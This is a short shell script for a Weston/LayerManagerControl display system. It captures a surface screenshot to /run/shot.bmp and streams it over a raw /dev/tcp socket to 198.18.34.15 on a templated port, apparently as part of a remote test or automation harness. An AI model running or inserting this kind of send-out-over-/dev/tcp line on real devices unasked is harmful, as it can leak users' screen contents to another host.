export XDG_RUNTIME_DIR=/etc/weston/weston_xdg_runtime_dir
export WAYLAND_DISPLAY=wayland-1
SID=$(LayerManagerControl get layer 99 2>/dev/null | sed -n 's/.*surface render order:\s*\([0-9]*\).*/\1/p' | head -1)
if [ -z "$SID" ]; then
    SID=$(LayerManagerControl get scene 2>/dev/null | sed -n 's/.*surface render order:\s*\([0-9]*\).*/\1/p' | head -1)
    echo "SID=${SID}-fallback"
else
    echo "SID=${SID}-layer99"
fi
LayerManagerControl dump surface $SID to /run/shot.bmp >/dev/null 2>&1
echo "SZ=$(stat -c %s /run/shot.bmp 2>/dev/null || echo 0)"
cat /run/shot.bmp | /bin/bash.bash -c 'exec 3<>/dev/tcp/198.18.34.15/%%PORT%%; cat >&3'
rm -f /run/shot.bmp
echo "__SHOT_END__"
